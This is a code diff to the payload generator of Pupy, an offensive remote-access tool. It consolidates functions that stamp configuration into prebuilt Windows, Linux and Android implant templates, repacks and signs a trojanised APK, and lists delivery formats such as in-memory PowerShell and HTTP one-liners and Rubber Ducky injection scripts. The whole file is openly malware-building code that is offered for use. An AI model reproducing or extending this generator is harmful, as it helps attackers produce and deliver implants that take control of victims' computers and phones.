@@ -29,46 +29,6 @@ ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__)))
 if __name__ == '__main__':
     Credentials.DEFAULT_ROLE = 'CLIENT'
 
-def get_edit_pupyx86_dll(conf, debug=False):
-    if debug:
-        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86d.dll"), conf)
-    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.dll"), conf)
-
-def get_edit_pupyx64_dll(conf, debug=False):
-    if debug:
-        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64d.dll"), conf)
-    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.dll"), conf)
-
-def get_edit_pupyx86_exe(conf, debug=False):
-    if debug:
-        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86d.exe"), conf)
-    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.exe"), conf)
-
-def get_edit_pupyx64_exe(conf, debug=False):
-    if debug:
-        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64d.exe"), conf)
-    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.exe"), conf)
-
-def get_edit_pupyx86_lin(conf, debug=False):
-    if debug:
-        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86d.lin"), conf)
-    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.lin"), conf)
-
-def get_edit_pupyx64_lin(conf, debug=False):
-    if debug:
-        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64d.lin"), conf)
-    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.lin"), conf)
-
-def get_edit_pupyx86_so(conf, debug=False):
-    if debug:
-        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86d.so"), conf)
-    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.so"), conf)
-
-def get_edit_pupyx64_so(conf, debug=False):
-    if debug:
-        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64d.so"), conf)
-    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.so"), conf)
-
 def get_edit_binary(path, conf):
     logging.debug("generating binary %s with conf: %s"%(path, conf))
     binary=b""
@@ -205,11 +165,12 @@ def updateTar(arcpath, arcname, file_path):
     finally:
         shutil.rmtree(tempdir)
 
-def get_edit_apk(path, new_path, conf):
-    tempdir=tempfile.mkdtemp(prefix="tmp_pupy_")
+def get_edit_apk(path, conf):
+    tempdir = tempfile.mkdtemp(prefix="tmp_pupy_")
+    fd, tempapk = tempfile.mkstemp(prefix="tmp_pupy_")
     try:
         packed_payload=pack_py_payload(get_raw_conf(conf))
-        shutil.copy(path, new_path)
+        shutil.copy(path, tempapk)
 
         #extracting the python-for-android install tar from the apk
         zf=zipfile.ZipFile(path,'r')
@@ -226,11 +187,11 @@ def get_edit_apk(path, new_path, conf):
         updateTar(os.path.join(tempdir,"assets/private.mp3"), "service/pp.pyo", os.path.join(tempdir,"pp.pyo"))
         #repacking the tar in the apk
         with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
-            updateZip(new_path, "assets/private.mp3", t.read())
+            updateZip(tempapk, "assets/private.mp3", t.read())
 
         #signing the tar
         try:
-            res=subprocess.check_output("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '%s' pupy_key"%new_path, shell=True)
+            res=subprocess.check_output("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '%s' pupy_key"%tempapk, shell=True)
         except OSError as e:
             if e.errno ==os.errno.ENOENT:
                 print "Please install jarsigner first."
@@ -238,9 +199,56 @@ def get_edit_apk(path, new_path, conf):
             raise e
         # -tsa http://timestamp.digicert.com
         print(res)
+        content = b''
+        with open(tempapk) as apk:
+            return apk.read()
+
     finally:
         #cleaning up
         shutil.rmtree(tempdir, ignore_errors=True)
+        os.unlink(tempapk)
+
+def generate_binary_from_template(config, osname, arch=None, shared=False, debug=False):
+    TEMPLATE_FMT = 'pupy{arch}{debug}.{ext}'
+    ARCH_CONVERT = {
+        'amd64': 'x64', 'x86_64': 'x64',
+        'i386': 'x86', 'i486': 'x86', 'i586': 'x86', 'i686': 'x86',
+    }
+
+    arch = ARCH_CONVERT.get(arch, arch)
+
+    CLIENTS = {
+        'android': (get_edit_apk, 'pupy.apk', False),
+        'linux': (get_edit_binary, TEMPLATE_FMT, True),
+        'windows': (get_edit_binary, TEMPLATE_FMT, False),
+    }
+
+    if not osname in CLIENTS.keys():
+        raise ValueError('Unknown OS ({}), known = '.format(
+            osname, ', '.join(CLIENTS.keys())))
+
+    generator, template, makex = CLIENTS[osname]
+
+    if '{arch}' in template and not arch:
+        raise ValueError('arch required for the target OS ({})'.format(osname))
+
+    shared_ext = 'dll' if osname == 'windows' else 'so'
+    non_shared_ext = 'exe' if osname == 'windows' else 'lin'
+    ext = shared_ext if shared else non_shared_ext
+    debug = 'd' if debug else ''
+
+    if shared:
+        makex = False
+
+    filename = template.format(arch=arch, debug=debug, ext=ext)
+    template = os.path.join(
+        ROOT, 'payload_templates', filename
+    )
+
+    if not os.path.isfile(template):
+        raise ValueError('Template not found ({})'.format(template))
+
+    return generator(template, config), filename, makex
 
 def load_scriptlets():
     scl={}
@@ -290,18 +298,13 @@ def parse_scriptlets(args_scriptlet, debug=False):
 class ListOptions(argparse.Action):
     def __call__(self, parser, namespace, values, option_string=None):
         print colorize("## available formats :", "green")+" usage: -f <format>"
-        print "\t- exe_86, exe_x64  : generate PE exe for windows"
-        print "\t- dll_86, dll_x64  : generate reflective dll for windows"
-        print "\t- lin_x86, lin_x64 : generate a ELF binary for linux"
-        print "\t- so_x86, so_x64   : generate a ELF .so for linux"
+        print "\t- client           : generate client binary"
         print "\t- py               : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
         print "\t- pyinst           : generate a python file compatible with pyinstaller"
         print "\t- py_oneliner      : same as \"py\" format but served over http to load it from memory with a single command line."
         print "\t- ps1              : generate ps1 file which embeds pupy dll (x86-x64) and inject it to current process."
         print "\t- ps1_oneliner     : load pupy remotely from memory with a single command line using powershell."
         print "\t- rubber_ducky     : generate a Rubber Ducky script and inject.bin file (Windows Only)."
-        print "\t- apk              : generate a apk for running pupy on android"
-
         print ""
         print colorize("## available transports :","green")+" usage: -t <transport>"
         for name, tc in transports.iteritems():
@@ -317,10 +320,19 @@ class ListOptions(argparse.Action):
             print '\n'.join(["\t"+x for x in sc.get_help().split("\n")])
         exit()
 
-PAYLOAD_FORMATS=['apk', 'lin_x86', 'lin_x64', 'so_x86', 'so_x64', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky']
+PAYLOAD_FORMATS = [
+    'client', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky'
+]
+
+CLIENT_OS = [ 'android', 'windows', 'linux' ]
+CLIENT_ARCH = [ 'x86', 'x64' ]
+
 if __name__=="__main__":
     parser = argparse.ArgumentParser(description='Generate payloads for windows, linux, osx and android.')
-    parser.add_argument('-f', '--format', default='exe_x86', choices=PAYLOAD_FORMATS, help="(default: exe_x86)")
+    parser.add_argument('-f', '--format', default='client', choices=PAYLOAD_FORMATS, help="(default: client)")
+    parser.add_argument('-O', '--os', default='windows', choices=CLIENT_OS, help='Target OS (default: windows)')
+    parser.add_argument('-A', '--arch', default='x86', choices=CLIENT_ARCH, help='Target arch (default: x86)')
+    parser.add_argument('-S', '--shared', default=False, action='store_true', help='Create shared object')
     parser.add_argument('-o', '--output', help="output path")
     parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
     parser.add_argument('-l', '--list', action=ListOptions, nargs=0, help="list available formats, transports, scriptlets and options")
@@ -368,62 +380,24 @@ if __name__=="__main__":
     conf['launcher_args']=args.launcher_args
     conf['offline_script']=script_code
     outpath=args.output
-    if args.format=="exe_x86":
-        binary=get_edit_pupyx86_exe(conf, debug=args.debug)
-        if not outpath:
-            outpath="pupyx86.exe"
-        with open(outpath, 'wb') as w:
-            w.write(binary)
-    elif args.format=="lin_x86":
-        binary=get_edit_pupyx86_lin(conf, debug=args.debug)
-        if not outpath:
-            outpath="pupyx86.lin"
-        with open(outpath, 'wb') as w:
-            w.write(binary)
-        os.chmod(outpath, 0711)
-    elif args.format=="so_x86":
-        binary=get_edit_pupyx86_lin(conf, debug=args.debug)
-        if not outpath:
-            outpath="pupyx86.so"
-        with open(outpath, 'wb') as w:
-            w.write(binary)
-        os.chmod(outpath, 0711)
-    elif args.format=="lin_x64":
-        binary=get_edit_pupyx64_lin(conf, debug=args.debug)
-        if not outpath:
-            outpath="pupyx64.lin"
-        with open(outpath, 'wb') as w:
-            w.write(binary)
-        os.chmod(outpath, 0711)
-    elif args.format=="so_x64":
-        binary=get_edit_pupyx64_lin(conf, debug=args.debug)
-        if not outpath:
-            outpath="pupyx64.so"
-        with open(outpath, 'wb') as w:
-            w.write(binary)
-        os.chmod(outpath, 0711)
-    elif args.format=="exe_x64":
-        binary=get_edit_pupyx64_exe(conf, debug=args.debug)
-        if not outpath:
-            outpath="pupyx64.exe"
-        with open(outpath, 'wb') as w:
-            w.write(binary)
-    elif args.format=="dll_x64":
-        binary=get_edit_pupyx64_dll(conf, debug=args.debug)
-        if not outpath:
-            outpath="pupyx64.dll"
-        with open(outpath, 'wb') as w:
-            w.write(binary)
-    elif args.format=="dll_x86":
-        binary=get_edit_pupyx86_dll(conf, debug=args.debug)
-        if not outpath:
-            outpath="pupyx86.dll"
-        with open(outpath, 'wb') as w:
-            w.write(binary)
-    elif args.format=="apk":
-        if not outpath:
-            outpath="pupy.apk"
-        get_edit_apk(os.path.join(ROOT, "payload_templates","pupy.apk"), outpath, conf)
+    if args.format=="client":
+        data, filename, makex = generate_binary_from_template(
+            conf, args.os,
+            arch=args.arch, shared=args.shared, debug=args.debug
+        )
+        outpath = outpath or filename
+
+        try:
+            os.unlink(outpath)
+        except:
+            pass
+
+        with open(outpath, 'w') as out:
+            out.write(data)
+
+        if makex:
+            os.chmod(outpath, 0511)
+
     elif args.format=="py" or args.format=="pyinst":
         linux_modules = ""
         if not outpath:
